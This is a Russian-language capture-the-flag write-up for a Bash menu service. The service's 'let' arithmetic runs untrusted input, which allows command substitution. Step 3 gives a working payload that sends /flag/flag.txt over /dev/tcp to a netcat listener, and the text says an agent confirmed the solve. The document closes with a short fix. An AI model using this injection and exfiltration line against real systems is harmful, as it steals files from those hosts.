# Bish Bash Bosh: ход решения

[English](solve.md)

## 1. Задача

Небольшое меню Bash просит число от 0 до 2 и показывает одно из трёх сообщений, но в арифметическую операцию передаётся пользовательский ввод.

Материалы: `server.sh`, `Dockerfile`, `entrypoint.sh`, compose; exploit command in evidence.

## 2. Уязвимость

Скрипт делает `read -r i`, затем `let i=$i-1` и лишь после этого проверяет диапазон перед `cat -- "${files[i]}"`. В арифметических выражениях Bash допускаются конструкции с индексами массивов и командной подстановкой. Такая подстановка может выполниться **до** проверки диапазона. В массиве даже есть `/flag/flag.txt` в начальном слоте, но простой выход за границы меню — не использованный путь.

## 3. Ход решения

1. Изучить `server.sh`: проблема в `let i=$i-1` с недоверенным значением, а не в последующем `cat`.
2. Подключиться к TCP-сервису и дождаться `What message would you like to see? (0..2)`.
3. Отправить выражение из сохранённого лога: `x[$(cat /flag/flag.txt > /dev/tcp/<listener>/4444)]`.
4. Перед этим запустить слушатель, например `nc -lvnp 4444`. При вычислении арифметики Bash выполняет подстановку и пересылает файл на слушатель.
5. Поздняя проверка может отвергнуть ввод, но выполненную команду не отменит. Флаг принят.

## 4. Доказательства и результат

Оригинальный `server.sh` показывает уязвимый `let` и индексацию массива. В журнале есть точный синтаксис команды и сетевой эксфильтрации, а также локальные пробы. Агент подтвердил решение.

Результат: 1 принятый флаг, полная строка скрыта (`PP{...}`).

## 5. Ограничения

В архиве сохранены команды, а не единый полный stdout. Механизм виден из Bash-скрипта; адрес слушателя и флаг в публичном тексте скрыты.

## 6. Защита

Строго разбирать только десятичные цифры до арифметической операции. Не вычислять пользовательские строки как Bash-выражения; простой `case` безопаснее.
